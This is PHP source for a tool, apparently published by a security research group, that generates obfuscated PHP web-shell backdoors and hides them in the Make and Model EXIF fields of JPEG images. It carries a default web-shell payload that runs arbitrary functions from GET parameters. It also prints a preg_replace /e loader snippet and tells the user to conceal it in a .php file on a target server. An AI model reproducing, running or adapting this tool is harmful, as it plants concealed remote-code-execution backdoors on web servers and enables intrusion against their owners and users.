<?php
/* PHP EXIF Backdoors generator using custom shellcode
 *  
 * About: PHPEB is a small tool that generates and stores obfuscated shellcode in user specified EXIF handlers.
 * Version: 1.0
 * Author: En: Cyber Security Research Center from Romania (CCSIR)
 * 		   Ro: Centrul de Cercetare in Securitate Informatica din Romania (CCSIR)
 * URL: http://ccsir.org
 * License: This program is free software: you can redistribute it and/or modify it 
 *          under the terms of the GNU General Public License as published 
 *          by the Free Software Foundation, either version 3 of the License, or (at your option) 
 *          any later version.
 *
 *          This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; 
 *          without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
 *          See the GNU General Public License for more details.
 *          You should have received a copy of the GNU General Public License along with this program. 
 *          If not, see http://www.gnu.org/licenses/.
*/

print " ################################################################\r\n";
print " # PHP Shellcode Obfuscated Generator for EXIF Backdoors        #\r\n";
print " # Author: Cyber Security Research Center from Romania - CCSIR  #\r\n";
print " # URL: ccsir.org                                               #\r\n";
 
if(!array_shift($argv) || !sizeof($argv) || (sizeof($argv) % 2) || sizeof($argv) > 6) {
	print " # Usage: php phpeb.php [params]                                #\r\n";
	print " # Params:                                                      #\r\n";
	print " #        -i path_to_image.jpg                                  #\r\n";
	print " #        -o path_to_backdoored_image.jpg                       #\r\n";
	print " #        -s shellcode (optional)                               #\r\n";
	print " #        -h EXIF headers (N/A in v1.0, Default:Make,Model)     #\r\n";
	print " #        -v verbose 1 or 0(optional, Default:0)                #\r\n";
	print " #           Default: !empty(\$1=@\$_GET[1]) && \$1(\$_GET[2]);     #\r\n";
	print " ################################################################\r\n\r\n\r\n";
	exit(1);

}
print " ################################################################\r\n\r\n\r\n";

$shellcode = '!empty($1=@$_GET[1]) && $1($_GET[2]);';
$verbose   = FALSE;
$headers   = 'Make,Model';

for($i=0;$i<sizeof($argv); $i+=2) {
	switch($argv[$i]) {
		case '-i': 
			$original = $argv[$i+1];
		break;
		case '-o':
			$backdoored = $argv[$i+1];
		break;
		case '-s':
			$shellcode = $argv[$i+1]; 
		break;
		case '-v':
			$verbose = (bool)$argv[$i+1];
		break;
		case '-h':
			#$headers = $argv[$i+1]; TODO
		break;
	} 
}

$used    = array();
$regex   = $payload = '';
$headers = explode(",", $headers);

generate();
write_exif();

function write_exif() {
	global $verbose, $headers, $regex, $payload, $original, $backdoored;
	
	require_once('pel/PelDataWindow.php');
	require_once('pel/PelJpeg.php');
	require_once('pel/PelTiff.php');
	 
	setlocale(LC_ALL, '');
	$data = new PelDataWindow(file_get_contents($original));

	if (PelJpeg::isValid($data)) {
	  $jpeg = $file = new PelJpeg();
	  $jpeg->load($data);
	  $exif = $jpeg->getExif();

	  if ($exif == null) {
	    if($verbose) print " # No APP1 section found, added new.\r\n";
		$exif = new PelExif();
	    $jpeg->setExif($exif);	    
	    $tiff = new PelTiff();
	    $exif->setTiff($tiff);
	  } else {
	    if($verbose) print " # Found existing APP1 section.\r\n";
	    $tiff = $exif->getTiff();
	  }
	} elseif (PelTiff::isValid($data)) {
	  $tiff = $file = new PelTiff();
	  
	  $tiff->load($data);
	} else {
	  print " # Unrecognized image format! The first 16 bytes follow:\r\n";
	  PelConvert::bytesToDump($data->getBytes(0, 16));
	  exit(1);
	}

	$ifd0 = $tiff->getIfd();

	if ($ifd0 == null) {
	  if($verbose) print " # No IFD found, adding new.\r\n";
	  $ifd0 = new PelIfd(PelIfd::IFD0);
	  $tiff->setIfd($ifd0);
	}

	//add MODEL EXIF header
	$desc = $ifd0->getEntry(PelTag::MODEL);
	if ($desc == null) {	  
	  if($verbose) print " # Added new MODEL entry with ".$payload."\r\n";
	  $desc = new PelEntryAscii(PelTag::MODEL, $payload);
	  $ifd0->addEntry($desc);
	} else {
	  
	  if($verbose) print 'Updating MODEL entry from "'.$desc->getValue().'" to "'.$payload.'".'."\r\n";	  
	  $desc->setValue($payload);
	} 
	
	//add MAKE EXIF header
	$desc = $ifd0->getEntry(PelTag::MAKE);
	if ($desc == null) {	  
	  if($verbose) print " # Added new MAKE entry with ".$regex."\r\n";
	  $desc = new PelEntryAscii(PelTag::MAKE, $regex);
	  $ifd0->addEntry($desc);
	} else {
	  
	  if($verbose) print 'Updating MAKE entry from "'.$desc->getValue().'" to "'.$regex.'".'."\r\n";	  
	  $desc->setValue($regex);
	} 
	

	print " # Saving backdoor file : ".$backdoored.".\r\n";
	$file->saveFile($backdoored);
	print " # Saved.\r\n";
	if($verbose) print "\r\n\r\n";
	print " # In order to work your backdoor, you need to hide this code very well in a .php file.\r\n";
	print "\r\n<?php\r\n\$exif = exif_read_data('path_to_backdoored_file_uploaded_on_server.jpg');\r\n";
	print "preg_replace(\$exif['".$headers[0]."'],\$exif['".$headers[1]."'],'');\r\n?>\r\n\r\n";
}

function generate() {
	global $shellcode, $verbose, $used, $regex, $payload;

	for($i=0;$i<strlen($shellcode);$i++)
	  $used[$shellcode{$i}]=1;
	for($i=0;$i<30;$i++) { 
		if(!isset($used[chr(ord('a')+$i)]))
			$seed[] = chr(ord('a')+$i);
		if(!isset($used[chr(ord('A')+$i)]))
			$seed[] = chr(ord('A')+$i);
	}
	$seed = implode('', $seed);

	if($verbose) print " # SHELLCODE: \r\n".$shellcode."\r\n";
	if($verbose) print " # SEED: \r\n".$seed."r\n";

	$payload = '';
	$random  = array();
	for($i=0;$i<strlen($shellcode);$i++) {	
		$payload[] = $shellcode[$i];
		$random[]  = $seed{rand(0,strlen($seed)-1)};
		$payload[] = end($random);
	}
	$payload = implode('',$payload);

	if($verbose) print " # PAYLOAD: \r\n".$payload."\r\n";

	$regex = "/[".preg_quote(implode($random))."]/e";

	  
	$sh = preg_replace(str_replace('/e','/',$regex),'',$payload);
	if($verbose) print " # SHELLCODE REVERSED: \r\n" .$sh."\r\n";
	if($verbose) print " # REGEX: \r\n".$regex."\r\n";
	if($verbose) print " # CHECK: ".(trim($sh) == trim($shellcode) ? "Good." : 'Bad.')."\r\n";
	if(trim($sh) != trim($shellcode)) {
		print " # Invalid reversed shellcode. \r\n";
		exit(1);
	}
	print " # Shellcode generated successfully. \r\n";
}
